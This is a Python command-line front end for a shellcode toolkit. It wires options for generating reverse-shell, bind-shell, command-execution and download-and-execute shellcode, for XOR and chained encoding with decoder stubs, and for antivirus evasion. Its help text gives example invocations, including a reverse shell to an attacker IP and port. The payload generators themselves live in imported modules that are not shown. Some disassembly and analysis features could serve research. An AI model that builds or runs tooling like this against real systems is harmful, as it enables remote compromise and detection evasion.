#!/usr/bin/env python3
"""
Advanced Shellcode Toolkit v2.0 - Modular Version
Enhanced with:
- Better error handling
- More architectures supported
- Improved evasion techniques
- Metamorphic code generation
- Shellcode validation
- Automated testing
- Better documentation
"""

import argparse
import os
import random
import socket
import struct
import subprocess
import tempfile
import textwrap
import zlib
import base64
import hashlib
import pyperclip
from collections import defaultdict
from typing import Dict, List, Tuple, Optional, Union, Callable, Any

from core.generator import ShellcodeGenerator
from core.analyzer import ShellcodeAnalyzer
from core.encoder import ShellcodeEncoder
from core.optimizer import ShellcodeOptimizer
from core.evasion import EvasionTechniques
from core.assembler import ShellcodeAssembler
from core.tester import ShellcodeTester
from utils.formatters import ShellcodeFormatter
from utils.validator import ShellcodeValidator
from constants import *

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Shellcode Toolkit v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          Generate reverse shell:
            %(prog)s --rev-shell --ip 192.168.1.100 --port 4444 --arch x86 --mode 32
          
          Disassemble shellcode with analysis:
            %(prog)s --disasm "31c050682f2f7368..." --arch x86 --mode 32 --analyze --stats
          
          Assemble ASM with optimizations:
            %(prog)s --asm "mov eax, 1; int 0x80" --arch x86 --mode 32 --optimize
            
          Generate bind shell with evasion:
            %(prog)s --bind-shell --port 4444 --arch x64 --mode 64 --evasion "nopsled,junk"
        """)
    )

    # Main functionality group
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--disasm", help="Hex shellcode to disassemble")
    group.add_argument("--hex-file", help="File with hex string")
    group.add_argument("--bin-file", help="Binary shellcode file")
    group.add_argument("--asm", help="Inline ASM code")
    group.add_argument("--asm-file", help="File with ASM")
    group.add_argument("--rev-shell", action="store_true", help="Generate reverse shell shellcode")
    group.add_argument("--bind-shell", action="store_true", help="Generate bind shell shellcode")
    group.add_argument("--exec-shell", help="Generate shellcode to execute a command")
    group.add_argument("--download-exec", help="Generate shellcode to download and execute a URL")

    # Architecture options
    arch_group = parser.add_argument_group("Architecture Options")
    arch_group.add_argument("-a", "--arch", choices=CS_ARCHS.keys(), help="Target architecture")
    arch_group.add_argument("-m", "--mode", choices=CS_MODES.keys(), help="Mode (16/32/64/etc)")
    arch_group.add_argument("--auto", action="store_true", help="Auto-detect arch/mode from file")

    # Output options
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument("--out", help="Output file")
    output_group.add_argument("--format", choices=["escaped", "inline", "hex", "raw", "c", "python", "base64"], 
                            default="escaped", help="Output format")
    output_group.add_argument("--copy", action="store_true", help="Copy output to clipboard")
    output_group.add_argument("--test", action="store_true", help="Test shellcode in simulated environment")

    # Transformation options
    transform_group = parser.add_argument_group("Transformation Options")
    transform_group.add_argument("--reverse", action="store_true", help="Reverse shellcode bytes")
    transform_group.add_argument("--key", help="XOR encode/decode key (e.g., 0xaa)")
    transform_group.add_argument("--decode-xor", action="store_true", help="Decode XOR-encoded shellcode")
    transform_group.add_argument("--encode", choices=ENCODERS.keys(), help="Encoding method to apply")
    transform_group.add_argument("--chain-encode", help="Comma-separated encoding methods for chained encoding")
    transform_group.add_argument("--chain-keys", help="Comma-separated keys for chained encoding")

    # Analysis options
    analysis_group = parser.add_argument_group("Analysis Options")
    analysis_group.add_argument("--analyze", action="store_true", help="Analyze shellcode for dangerous ops")
    analysis_group.add_argument("--stats", action="store_true", help="Show instruction statistics")
    analysis_group.add_argument("--validate", action="store_true", help="Validate shellcode structure")

    # Optimization options
    opt_group = parser.add_argument_group("Optimization Options")
    opt_group.add_argument("--optimize", action="store_true", help="Optimize shellcode size")
    opt_group.add_argument("--evasion", help="Comma-separated AV evasion techniques (nopsled,junk,etc)")

    # Shellcode parameters
    param_group = parser.add_argument_group("Shellcode Parameters")
    param_group.add_argument("--ip", help="Attacker IP for reverse shell")
    param_group.add_argument("--port", type=int, help="Port number for shell")
    param_group.add_argument("--stager", help="Stager shellcode file for staged payload")
    param_group.add_argument("--payload", help="Payload file for staged shellcode")

    args = parser.parse_args()

    try:
        # Handle shellcode generation
        if args.rev_shell or args.bind_shell or args.exec_shell or args.download_exec:
            if not args.arch or not args.mode:
                parser.error("Shellcode generation requires --arch and --mode")

            try:
                if args.rev_shell:
                    if not args.ip or not args.port:
                        parser.error("Reverse shell requires --ip and --port")
                    shellcode = ShellcodeGenerator.generate_reverse_shell(args.ip, args.port, args.arch, args.mode)
                elif args.bind_shell:
                    if not args.port:
                        parser.error("Bind shell requires --port")
                    shellcode = ShellcodeGenerator.generate_bind_shell(args.port, args.arch, args.mode)
                elif args.exec_shell:
                    shellcode = ShellcodeGenerator.generate_exec_shell(args.exec_shell, args.arch, args.mode)
                elif args.download_exec:
                    shellcode = ShellcodeGenerator.generate_download_exec(args.download_exec, args.arch, args.mode)

                # Apply encoding if requested
                if args.encode and args.key:
                    try:
                        key = int(args.key, 0)
                        shellcode = ShellcodeEncoder.encode_bytes(shellcode, args.encode, key)
                        print(f"[*] Applied {args.encode.upper()} encoding with key {hex(key)}")
                        
                        # For XOR, generate a decoder stub
                        if args.encode == "xor":
                            shellcode = ShellcodeEncoder.generate_xor_stub(shellcode, key)
                            print("[*] Embedded polymorphic XOR decoder stub")
                    except Exception as e:
                        print(f"[!] {args.encode.upper()} encoding error: {e}")
                        return

                # Apply chained encoding if requested
                if args.chain_encode and args.chain_keys:
                    try:
                        methods = args.chain_encode.split(',')
                        keys = [int(k, 0) for k in args.chain_keys.split(',')]
                        if len(methods) != len(keys):
                            raise ValueError("Number of methods and keys must match")
                        shellcode = ShellcodeEncoder.chain_encode(shellcode, methods, keys)
                        print(f"[*] Applied chained encoding: {args.chain_encode}")
                    except Exception as e:
                        print(f"[!] Chained encoding error: {e}")
                        return

                # Apply optimizations
                if args.optimize:
                    shellcode = ShellcodeOptimizer.optimize(shellcode, args.arch, args.mode)

                # Apply evasion techniques
                if args.evasion:
                    shellcode = EvasionTechniques.apply(shellcode, args.evasion.split(","))

                # Test shellcode if requested
                if args.test:
                    ShellcodeTester.test_shellcode(shellcode, args.arch, args.mode)

                # Validate shellcode if requested
                if args.validate:
                    try:
                        ShellcodeValidator.validate_shellcode(shellcode)
                        print("[+] Shellcode validation passed")
                        analysis = ShellcodeValidator.analyze_shellcode(shellcode)
                        print(f"  Length: {analysis['length']} bytes")
                        print(f"  Null bytes: {'Yes' if analysis['null_bytes'] else 'No'}")
                        print(f"  Entropy: {analysis['entropy']:.2f}")
                    except ValueError as e:
                        print(f"[!] Shellcode validation failed: {e}")

                # Format output
                output = ShellcodeFormatter.format(shellcode, args.format)

                # Handle output
                if isinstance(output, bytes):
                    if not args.out:
                        print("[!] Raw format requires --out to save binary.")
                    else:
                        with open(args.out, "wb") as f:
                            f.write(output)
                        print(f"[*] Saved raw binary to {args.out}")
                else:
                    print(f"\n[*] Generated Shellcode:")
                    print(output)
                    if args.copy:
                        pyperclip.copy(output)
                        print("[*] Copied to clipboard")
                    if args.out:
                        with open(args.out, "w") as f:
                            f.write(output)
                        print(f"[*] Saved to {args.out}")
            except Exception as e:
                print(f"[!] Error generating shellcode: {e}")
            return

        # Handle auto-detection
        if args.auto:
            file_path = args.bin_file or args.hex_file
            if not file_path:
                parser.error("Auto mode requires --bin-file or --hex-file")
                
            arch, mode = ShellcodeAnalyzer.detect_arch_mode(file_path)
            if not arch:
                print("[!] Failed to detect arch/mode.")
                return
            args.arch, args.mode = arch, mode
            print(f"[*] Detected arch: {arch}, mode: {mode}")

        # Handle disassembly
        if args.disasm or args.hex_file or args.bin_file:
            if not args.arch or not args.mode:
                parser.error("Disassembly requires --arch and --mode")
                
            hex_code = ""
            if args.disasm:
                hex_code = args.disasm.strip().replace(" ", "").replace("\n", "")
            elif args.hex_file:
                try:
                    with open(args.hex_file, "r") as f:
                        hex_code = f.read().strip().replace(" ", "").replace("\n", "")
                except Exception as e:
                    print(f"[!] Read error: {e}")
                    return
            elif args.bin_file:
                try:
                    with open(args.bin_file, "rb") as f:
                        hex_code = f.read().hex()
                except Exception as e:
                    print(f"[!] Binary read error: {e}")
                    return
                    
            ShellcodeAnalyzer.disassemble(
                hex_code, args.arch, args.mode, 
                reverse=args.reverse, 
                analyze=args.analyze,
                stats=args.stats
            )

        # Handle assembly
        elif args.asm or args.asm_file:
            asm_code = ""
            if args.asm:
                asm_code = args.asm
            elif args.asm_file:
                try:
                    with open(args.asm_file, "r") as f:
                        asm_code = f.read()
                except Exception as e:
                    print(f"[!] ASM file read error: {e}")
                    return
                    
            shellcode = ShellcodeAssembler.assemble(
                asm_code, args.arch, args.mode,
                reverse=args.reverse,
                optimize=args.optimize,
                evasion=args.evasion,
                decode_xor=args.decode_xor,
                xor_key=args.key
            )
            
            if shellcode is None:
                return
                
            output = ShellcodeFormatter.format(shellcode, args.format)
            print("\n[*] Generated Shellcode:")
            print(output)
            
            if args.copy and isinstance(output, str):
                pyperclip.copy(output)
                print("[*] Copied to clipboard")
                
            if args.out:
                try:
                    if args.format == "raw":
                        with open(args.out, "wb") as f:
                            f.write(output)
                    else:
                        with open(args.out, "w") as f:
                            f.write(output)
                    print(f"[*] Saved to: {args.out}")
                except Exception as e:
                    print(f"[!] Write error: {e}")

            if args.test:
                ShellcodeTester.test_shellcode(shellcode, args.arch, args.mode)

            if args.validate:
                try:
                    ShellcodeValidator.validate_shellcode(shellcode)
                    print("[+] Shellcode validation passed")
                    analysis = ShellcodeValidator.analyze_shellcode(shellcode)
                    print(f"  Length: {analysis['length']} bytes")
                    print(f"  Null bytes: {'Yes' if analysis['null_bytes'] else 'No'}")
                    print(f"  Entropy: {analysis['entropy']:.2f}")
                except ValueError as e:
                    print(f"[!] Shellcode validation failed: {e}")

    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

if __name__ == "__main__":
    main()